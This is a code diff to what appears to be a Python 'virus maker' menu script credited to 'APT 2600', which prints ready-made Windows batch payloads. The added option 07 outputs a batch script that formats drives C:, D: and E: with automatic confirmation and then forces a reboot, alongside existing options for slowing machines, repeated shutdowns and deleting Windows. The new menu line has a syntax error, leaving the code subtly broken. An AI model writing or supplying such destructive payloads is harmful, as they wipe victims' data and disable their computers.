@@ -14,6 +14,7 @@ print ("    [03]>[Virus Make the machine slow]")
 print ("    [04]>[Virus Virus Shut down every 5 seconds]")
 print ("    [05]>[Virus Broken internet]")
 print ("    [06]>[Virus Delet Windown]")
+print ("    [07]>[Virus Fromat all drives]
 print ("    [00]>[Black To HOME KILLER ]")
 print (" \033[34m ")
 print
@@ -95,6 +96,22 @@ elif qu2 == "06" or qu2 == "6":
           @shutdown -s
           """
  print (V6)
+elif qu2 == "07" or qu2 == "7":
+ print ("\033[31m")
+ os.system ("clear")
+ os.system ("figlet Virus 7")
+ print (" \033[32m PYTHON PROGRAM BY APT 2600 ")
+ V7 = """\033[31m
+          @echo off
+          ping ***.***.***.***
+          format c:
+          y
+          format d:
+          y
+          format e:
+          y
+
+          shutdown -r -f -t 10"""
 elif qu2 == "00" or qu2 == "0":
  print ("\033[0m")
  os.system ("cd /$HOME/KILLER")
